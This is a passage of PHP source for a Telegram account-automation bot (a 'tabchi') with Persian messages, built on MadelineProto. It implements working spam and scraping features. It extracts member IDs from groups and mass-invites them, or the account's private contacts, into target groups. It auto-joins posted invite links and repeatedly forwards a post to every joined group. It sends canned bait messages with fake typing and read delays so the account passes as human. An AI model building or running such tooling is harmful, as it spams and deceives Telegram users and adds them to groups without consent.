            elseif ( $msg == 'delchs' || $msg == '/delchs' || $msg == 'Delchs' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $all = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == 'channel' ) {
                  $id = $type[ 'bot_api_id' ];
                  yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "از همه ی کانال ها لفت دادم 👌\n تعداد لفت : $i", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg, $text );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $count = 0;
              $i = 0;
              $all = yield $MadelineProto->get_dialogs();
              foreach ( $all as $peer ) {
                try {
                  $type = yield $MadelineProto->get_info( $peer );
                  $type3 = $type[ 'type' ];
                  if ( $type3 == 'supergroup' || $type3 == 'chat' ) {
                    $id = $type[ 'bot_api_id' ];
                    if ( $chatID != $id ) {
                      yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                      $count++;
                      $i++;
                      if ( $count == $text[ 2 ] ) {
                        break;
                      }
                    }
                  }
                } catch ( Exception $m ) {}
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "از $i تا گروه لفت دادم 👌", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(autochatpv) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autochatpv) (on|off)$/i", $msg, $m );
              $data[ 'autochatpv' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار پیوی روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار پیوی خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autochatgroup) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autochatgroup) (on|off)$/i", $msg, $m );
              $data[ 'autochatgroup' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار گروه روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار گروه خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg, $m );
              $data[ 'autojoinadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🤖 حالت جوین خودکار ادمین روشن شد ✅\nبا ارسال لینک گروه یا کانال ربات به طور خودکار اد میشود ", 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت جوین خودکار ادمین خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
			elseif ( preg_match( "/^[\/\#\!]?(autojoinall) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autojoinall) (on|off)$/i", $msg, $m );
              $data[ 'autojoinall' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🤖 حالت جوین خودکار همه روشن شد ✅\n هر کسی جز ادمین لینک گروه یا کانال ارسال کند تبچی عضو آن میشود. ", 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت جوین خودکار همه خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg, $m );
              $data[ 'autoforwardadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت فوروارد خودکار به پیوی ادمین روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت فوروارد خودکار به پیوی ادمین خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(join) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(join) (.*)$/i", $msg, $text );
              $id = $text[ 2 ];
              try {
                yield $MadelineProto->channels->joinChannel( [ 'channel' => "$id" ] );
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '✅ Joined',
                  'reply_to_msg_id' => $msg_id
                ] );
              } catch ( Exception $e ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❗️<code>' . $e->getMessage() . '</code>',
                  'parse_mode' => 'html',
                  'reply_to_msg_id' => $msg_id
                ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(SetId) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(SetId) (.*)$/i", $msg, $text );
              $id = $text[ 2 ];
              try {
                $User = yield $MadelineProto->account->updateUsername( [ 'username' => "$id" ] );
              } catch ( Exception $v ) {
                $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❗' . $v->getMessage() ] );
              }
              $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => "• نام کاربری جدید برای ربات تنظیم شد :
 @$id"
              ] );
            }
            elseif ( strpos( $msg, '/profile ' ) !== false ) {
              $ip = trim( str_replace( "/profile ", "", $msg ) );
              $ip = explode( "|", $ip . "|||||" );
              $id1 = trim( $ip[ 0 ] );
              $id2 = trim( $ip[ 1 ] );
              $id3 = trim( $ip[ 2 ] );
              yield $MadelineProto->account->updateProfile( [ 'first_name' => "$id1", 'last_name' => "$id2", 'about' => "$id3" ] );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🔸نام جدید تبچی: $id1
🔹نام خانوادگی جدید تبچی: $id2
🔸بیوگرافی جدید تبچی: $id3" ] );
            }

            elseif ( strpos( $msg, 'addpvs ' ) !== false ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => ' ⛓درحال ادد کردن ...' ] );
              $gpid = explode( 'addpvs ', $msg )[ 1 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == 'user' ) {
                  $pvid = $type[ 'user_id' ];
                  $MadelineProto->channels->inviteToChannel( [ 'channel' => $gpid, 'users' => [ $pvid ] ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "همه افرادی که در پیوی بودند را در گروه $gpid ادد کردم 👌🏻\n تعداد تلاش : $i " ] );
            }

            elseif ( preg_match( "/^[#\!\/](addall) (.*)$/", $msg ) ) {
              preg_match( "/^[#\!\/](addall) (.*)$/", $msg, $text1 );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $user = $text1[ 2 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                try {
                  $type = yield $MadelineProto->get_info( $peer );
                  $type3 = $type[ 'type' ];
                } catch ( Exception $d ) {}
                if ( $type3 == 'supergroup' ) {
                  try {
                    yield $MadelineProto->channels->inviteToChannel( [ 'channel' => $peer, 'users' => [ "$user" ] ] );
                    $i++;
                  } catch ( Exception $d ) {}
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "کاربر **$user** توی همه ی ابرگروه ها ادد شد ✅ \n تعداد تلاش : $i ",
                'parse_mode' => 'MarkDown'
              ] );
            }

            elseif ( preg_match( "/^[#\!\/](setPhoto) (.*)$/", $msg ) ) {
              preg_match( "/^[#\!\/](setPhoto) (.*)$/", $msg, $text1 );
              if ( strpos( $text1[ 2 ], '.jpg' ) !== false or strpos( $text1[ 2 ], '.png' ) !== false ) {
                copy( $text1[ 2 ], 'photo.jpg' );
                yield $MadelineProto->photos->updateProfilePhoto( [ 'id' => 'photo.jpg' ] );
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '📸 عکس پروفایل جدید باموفقیت ست شد.', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ فایل داخل لینک عکس نمیباشد!', 'reply_to_msg_id' => $msg_id ] );
              }
            }

            elseif ( preg_match( "/^[#\!\/](setFtime) (.*)$/", $msg ) ) {
              if ( isset( $update[ 'message' ][ 'reply_to_msg_id' ] ) ) {
                if ( $type2 == 'supergroup' ) {
                  preg_match( "/^[#\!\/](setFtime) (.*)$/", $msg, $text1 );
                  if ( $text1[ 2 ] < 30 ) {
                    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '**❗️خطا: عدد وارد شده باید بیشتر از 30 دقیقه باشد.**', 'parse_mode' => 'MarkDown' ] );
                  } else {
                    $time = $text1[ 2 ] * 60;
                    if ( !is_dir( 'ForTime' ) ) {
                      mkdir( 'ForTime' );
                    }
                    file_put_contents( "ForTime/msgid.txt", $update[ 'message' ][ 'reply_to_msg_id' ] );
                    file_put_contents( "ForTime/chatid.txt", $chatID );
                    file_put_contents( "ForTime/time.txt", $time );
                    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ فروارد زماندار باموفقیت روی این پُست درهر $text1[2] دقیقه تنظیم شد.", 'reply_to_msg_id' => $update[ 'message' ][ 'reply_to_msg_id' ] ] );
                  }
                } else {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
                }
              }
            }
			
			
			elseif(preg_match("/^[\/\#\!]?(خروج|left)$/i", $msg)){
			  $type = yield $this->get_info($chatID);
			  $type3 = $type['type'];
			  if($type3 == "supergroup"){
				yield $this->messages->sendMessage(['peer' => $chatID,'message' => "Bye!! :)"]);
				yield $this->channels->leaveChannel(['channel' => $chatID, ]);
			  }else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "❗ این دستور مخصوص استفاده در سوپرگروه میباشد"]);
			  }
			}
			
			elseif($msg == 'delall' or $msg == 'پاکسازی کلی'){
			  if($type2 == "supergroup"||$type2 == "chat"){
				yield $this->messages->sendMessage([
				'peer' => $chatID,
				'reply_to_msg_id' => $msg_id,
				'message'=> "با موفقیت پاکسازی شد", 
				'parse_mode'=> 'markdown' ,
				]);
				$array = range($msg_id,1);
				$chunk = array_chunk($array,100);
				foreach($chunk as $v){
				  sleep(0.05);
				  yield $this->channels->deleteMessages([
				  'channel' =>$chatID,
				  'id' =>$v
				]);
				}
			  }
			  else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "❗ این دستور مخصوص استفاده در گروه ها میباشد"]);
			  }
			}
			
			elseif ( preg_match( '/^\/?(export) (.*)$/ui', $msg, $text1 ) ) {
			  if ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "⛏ در حال استخراج ..." ] );
				$chat = yield $MadelineProto->getPwrChat( $text1[ 2 ] );
				$i = 0;
				foreach ( $chat[ 'participants' ] as $pars ) {
				  $id = $pars[ 'user' ][ 'id' ];
				  if ( !in_array( $id, $member[ 'list' ] ) ) {
					$member[ 'list' ][] = $id;
					file_put_contents( "member.json", json_encode( $member ) );
					$i++;
				  }
				  if ( $i == 1000 ) break;
				}
			    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ انجام شد. \n $i ممبر استخراج شد. \n اگر بیشتر میخواهید دوباره بفرستید." ] );
			  }
			  else{
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ اخطار : جهت استخراج اعضای گروه لطفا لینک گروه را بعد از export وارد کنید." ] );
			  }
			}
			
			elseif ( preg_match( '/^\/?(add) (.*)$/ui', $msg, $text1 ) ) {
			  if (! preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🔄 در حال اد کردن اعضای استخراج شده ..." ] );
				$gpid = $text1[ 2 ];
				if ( !file_exists( "$gpid.json" ) ) {
				  file_put_contents( "$gpid.json", '{"list":{}}' );
				}
				@$addmember = json_decode( file_get_contents( "$gpid.json" ), true );
				$c = 0;
				$add = 0;
				foreach ( $member[ 'list' ] as $id ) {
				  if ( !in_array( $id, $addmember[ 'list' ] ) ) {
					$addmember[ 'list' ][] = $id;
					file_put_contents( "$gpid.json", json_encode( $addmember ) );
					$c++;
					try {
					  yield $MadelineProto->channels->inviteToChannel( [ 'channel' => $gpid, 'users' => [ "$id" ] ] );
					  $add++;
					} catch ( danog\ MadelineProto\ RPCErrorException $e ) {
						if ( $e->getMessage() == "PEER_FLOOD" ) {
						  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "⛔ محدود شده اید" ] );
						  break;
						}
					}
				  }
				}
				unlink( "$gpid.json" );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ با موفقیت اد کرد.\n تعداد اعضای اد شده : $add \n تعداد تلاش : $c" ] );
			  }
			  else{
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ اخطار : جهت اد کردن اعضای استخراج شده ایدی گروه را بعد از add وارد کنید." ] );
			  }
			}
			
			elseif ( preg_match( '/^\/?(deletemember)$/ui', $msg ) ) {
			  $member[ 'list' ] = [];
			  file_put_contents( "member.json", json_encode( $member ) );
			  yield $this->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🗑 اعضای استخراج شده حذف شدند." ] );
			}
			
			
			
			elseif ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
              if ( @$data[ 'autojoinadmin' ][ 'on' ] == 'on' ) {
                preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg, $l );
                $link = $l[ 0 ];
                try {
                  yield $MadelineProto->messages->importChatInvite( [
                    'hash' => str_replace( 'https://t.me/joinchat/', '', $link ),
                  ] );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '♻️ تبچی ♡SONY در یک گروه عضو شد ♻️' ] );
                } catch ( \danog\ MadelineProto\ RPCErrorException $e ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ محدودیت عضو شدن!' ] );
                } catch ( \danog\ MadelineProto\ Exception $e2 ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ محدودیت عضو شدن!' ] );
                }
              }
            }
          }
		  
//===========================================================
		  elseif ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
            if ( @$data[ 'autojoinall' ][ 'on' ] == 'on' ) {
              preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg, $l );
              $link = $l[ 0 ];
              try {
                yield $MadelineProto->messages->importChatInvite( [
                  'hash' => str_replace( 'https://t.me/joinchat/', '', $link ),
                ] );
              }catch ( \danog\ MadelineProto\ RPCErrorException $e ) { }
               catch ( \danog\ MadelineProto\ Exception $e2 ) { }
            }
          }
          elseif(isset($update['message']['media']['_']) and $update['message']['media']['_'] == 'messageMediaContact' and !in_array($update['message']['media']['user_id'] , yield $this->contacts->getContactIDs())){
 $media = $update['message']['media'];
 yield $this->contacts->importContacts(['contacts' =>[['_' => 'inputPhoneContact', 'client_id' => 1, 'phone' => $media['phone_number'], 'first_name' => $media['first_name']]]]);
 $me = yield $this->getSelf();
 yield $this->messages->sendMedia(['peer' => $update, 'reply_to_msg_id' => $msg_id, 'media' => ['_' => 'inputMediaContact', 'phone_number' => $me['phone'], 'first_name' => $me['first_name']]]);
}
		  elseif ( $type2 == 'user' ) {
			if ( @$data[ 'autoforwardadmin' ][ 'on' ] == 'on') {
			  yield $MadelineProto->messages->forwardMessages( [ 'from_peer' => $userID, 'to_peer' => $admin, 'id' => [ $msg_id ] ] );
			}
			if ( @$data[ 'autochatpv' ][ 'on' ] == 'on') {
			  $files = glob( 'ans/pv/*' );
			  foreach ( $files as $file ) {
				if ( is_file( $file ) ) {
				  $file1 = str_replace( "ans/pv/", "", $file );
				  $filename = str_replace( ".txt", "", $file1 );
				  if ( strpos( $msg, $filename ) !== false ) {
					$file = fopen( $file, "r" );
					$i = 0;
					while ( !feof( $file ) ) {
						$arr[ $i ] = fgets( $file );
						$i++;
					}
					fclose( $file );
					$file1 = $arr[ rand( 0, $i - 2 ) ];
					yield $MadelineProto->sleep( 2 );
					yield $MadelineProto->messages->readHistory( [ 'peer' => $userID, 'max_id' => $msg_id ] );
					yield $MadelineProto->sleep( 2 );
					yield $MadelineProto->messages->setTyping( [ 'peer' => $chatID, 'action' => [ '_' => 'sendMessageTypingAction' ] ] );
					yield $MadelineProto->sleep( 1 );
					yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $file1, 'reply_to_msg_id' => $msg_id ] );
					break;
				  }
				}
			  }
				
			}
		  }
		  
		  elseif ( $type2 != 'channel' && @$data[ 'autochatgroup' ][ 'on' ] == 'on') { //&& rand(0, 10) == 1
			if ( file_exists( "ans/group/$msg.txt" ) ) {
			  $file = fopen( "ans/group/$msg.txt", "r" );
			  $i = 0;
			  while ( !feof( $file ) ) {
				$arr[ $i ] = fgets( $file );
				$i++;
			  }
			  fclose( $file );
			  $file1 = $arr[ rand( 0, $i - 2 ) ];
			  yield $MadelineProto->sleep( 1 );
			  yield $MadelineProto->messages->setTyping( [ 'peer' => $chatID, 'action' => [ '_' => 'sendMessageTypingAction' ] ] );
			  yield $MadelineProto->sleep( 1 );
			  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $file1, 'reply_to_msg_id' => $msg_id ] );
			}
		  }

 if ($type2 != 'channel' && @$data['autochat']['on'] == 'on' && rand(0, 2000) == 1) {
 yield $MadelineProto->sleep(4);

 if($type2 == 'user'){
  yield $MadelineProto->messages->readHistory(['peer' => $userID, 'max_id' => $msg_id]);
 yield $MadelineProto->sleep(2);
 }

yield $MadelineProto->messages->setTyping(['peer' => $chatID, 'action' => ['_' => 'sendMessageTypingAction']]);

$eagle = array('❄️اوف چ سکوتیه گروه 🕷🕷عنکبوت تو دهن گسی ک چت نکنه😐','🍂اهه😐','😂اوه یکی بیاد بلیسه منو','😐😐😐جوون😐','😕ناموسا اینارو نگا ','😎💄',':/','😂قلبم پاره پارس والا بوخودا❤️','🤦سالام🤦🏻‍♀🤦🏻‍♀','🚶🏻‍♀🚶🏻‍♀🚶🏻‍♀','🎈😐','شعت 🤐','سالام🥶دلام','سلوم','خوبین','کم چت کنین هنگم ه ه ه ه  🤦‍♂','اهه','سارام از تبریز خخخ','چن سالتونه اصل بدین','تبزیزی هس؟ ','اوف','💋💋','.','.','.','.','سالام من فقط سلام میکنم میرم مدیر منو مدیر کن تا نرم خخخ ','مدیر عاشقم شده ک بیا تی ویم خخخ','اخ درم قش رف براتو','اقا هست بیاد پیوی');
$texx = $eagle[rand(0, count($eagle) - 1)];
 yield $MadelineProto->sleep(1);
 yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => "$texx"]);
}
	  
          if ( file_exists( 'ForTime/time.txt' ) ) {
            if ( ( time() - filectime( 'ForTime/time.txt' ) ) >= file_get_contents( 'ForTime/time.txt' ) ) {
              $tt = file_get_contents( 'ForTime/time.txt' );
              unlink( 'ForTime/time.txt' );
              file_put_contents( 'ForTime/time.txt', $tt );
              $dialogs = yield $MadelineProto->get_dialogs();
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                if ( $type[ 'type' ] == 'supergroup' || $type[ 'type' ] == 'chat' ) {
                  $MadelineProto->messages->forwardMessages( [ 'from_peer' => file_get_contents( 'ForTime/chatid.txt' ), 'to_peer' => $peer, 'id' => [ file_get_contents( 'ForTime/msgid.txt' ) ] ] );
                }
              }
            }
          }
          if ( $userID == $admin || isset( $data[ 'admins' ][ $userID ] ) ) {
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => false, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }
          if ( $userID == $admin ) {
            if ( !file_exists( 'true' ) && file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 <= 4000 ) {
              file_put_contents( 'true', '' );
              yield $MadelineProto->sleep( 3 );
              copy( 'king.madeline', 'update-session/king.madeline' );
            }
          }
        }
      }
    } catch ( Exception $e ) {}
  }
}
register_shutdown_function( 'shutdown_function', $lock );
closeConnection();
$MadelineProto->async( true );
$MadelineProto->loop( function ()use( $MadelineProto ) {
  yield $MadelineProto->setEventHandler( '\EventHandler' );
} );
$MadelineProto->loop();
